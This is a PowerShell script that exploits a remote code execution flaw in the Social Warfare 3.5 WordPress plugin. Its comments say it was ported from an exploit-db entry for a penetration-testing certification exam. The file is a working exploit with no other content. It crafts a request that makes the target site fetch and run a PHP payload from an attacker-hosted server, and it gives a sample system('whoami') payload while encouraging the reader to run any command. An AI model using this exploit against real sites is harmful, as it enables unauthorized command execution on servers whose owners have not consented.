Function Exploit-SocialWarFare {

<#
.Synopsis
    Exploits a vulnerability in the WordpressPlugin Social Warfare 3.5
    Ported from: https://www.exploit-db.com/exploits/46794

.DESCRIPTION
    The script exploits a vulnerability that enables remote code execution on the target. You will need a local webserver (http) hosting a payload file.
    The payload should look like this:

    <pre>system('whoami')</pre>
   
    Feel free to run any command you want on the target.

.PARAMETER Protocol
    Sets the protocol to use (http, https)
    Defaults to http

.PARAMETER TargetIp
    Sets the IP of the target

.PARAMETER TargetPort
    Sets the target port.
    Defaults to 80
   
.PARAMETER path
    Sets the remote path of the wordpress installation. (Omit ending slashes. Ex.: "/blog")

.PARAMETER LocalIp
    Sets the IP of the webserver hosting the payload
    
.PARAMETER LocalPort
    Sets the local port

.PARAMETER PayloadFile
    The name of the payload file on the local server
    
.PARAMETER NoOutput
    Use this switch to supress the output to screen    

.EXAMPLE
  Exploit-SocialWarFare -TargetIp 10.10.10.2 -Path wordpress -PayloadFile payload.txt -LocalIp 10.10.10.5 -LocalPort 80 -NoOutput

.LINK
    https://stackoverflow.com/questions/18771424/how-to-get-powershell-invoke-restmethod-to-return-body-of-http-500-code-response
    https://www.exploit-db.com/exploits/46794

.NOTE
    This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
    http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
    Student ID: PSP-6248

#>



[CmdletBinding()]
Param(
    
    #Protocol
    [Parameter(Mandatory = $true)]
    [String]
    $Protocol = "http",

    # Targets IP
    [Parameter(Mandatory = $true)]
    [String]
    $TargetIp,

    [Parameter(Mandatory = $true)]
    [int]
    $TargetPort = 80,

    # Path to WordPress installation - ex.: /blog
    [Parameter(Mandatory = $true)]
    [String]
    $Path,

    # LocalIp
    [Parameter(Mandatory = $true)]
    [String]
    $LocalIp,
    
    #LocalPort
    [Parameter(Mandatory = $true)]
    [Int]
    $LocalPort,

     #Payload file name
    [Parameter(Mandatory = $true)]
    [String]
    $PayloadFile = "payload.txt",

    #Show output 
    [Parameter(Mandatory = $false)]
    [Switch]
    $NoOutput
    )

    #Creating exploit URL    
    $Url = $Protocol + "://" + $TargetIp + ":" + $TargetPort + $path + "/wp-admin/admin-post.php?swp_debug=load_options" + "&" +"swp_url=http://" + $LocalIp + "/" + $PayloadFile
       
    # Sending payload...
    Write-Host ""
    Write-Host "Exploiting Social Warfare..." -ForegroundColor Magenta
    Write-Host ("-" *40)
    Write-Host "`nSending exploit to: $Url`n"
    Write-Host ("-" *40)
    Write-Host ""
    
    $Result = try {   
                Invoke-WebRequest  -Uri $Url
                } 
     
              catch {
                $result = $_.Exception.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($result)
                $reader.BaseStream.Position = 0
                $reader.DiscardBufferedData()
                $responseBody = $reader.ReadToEnd();
                }

    # Prettify the output
    $OutputBody = $responseBody.Split("<")[0]
    
        if ($NoOutput) {
        break
        }

        Else {
           Write-host "Output:" -ForegroundColor Green
           $OutputBody
           }
   } 

